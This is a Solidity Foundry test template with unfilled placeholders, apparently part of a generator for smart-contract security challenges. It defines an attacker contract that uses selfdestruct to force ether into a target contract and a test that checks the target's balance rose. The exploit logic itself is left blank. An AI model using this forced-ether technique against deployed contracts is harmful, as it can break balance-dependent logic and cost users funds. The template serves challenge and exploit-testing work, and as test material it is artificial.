// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "../challenges/{challenge_folder}/{main_contract}.sol";

contract {test_contract_name} is Test {{
    {target_contract} public target;
    SelfDestructAttacker public attacker;
    
    uint256 constant INITIAL_BALANCE = {initial_balance};

    function setUp() public {{
        target = new {target_contract}();
        attacker = new SelfDestructAttacker();
        vm.deal(address(attacker), INITIAL_BALANCE);
        {setup_code}
    }}

    function testExploit() public {{
        uint256 targetBalanceBefore = address(target).balance;
        
        attacker.pwn{{value: INITIAL_BALANCE}}(address(target));
        
        assertGt(address(target).balance, targetBalanceBefore, "Target should receive ETH via selfdestruct");
        {final_assertion}
    }}
}}

contract SelfDestructAttacker {{
    function pwn(address target) external payable {{
        {exploit_logic}
        selfdestruct(payable(target));
    }}
}}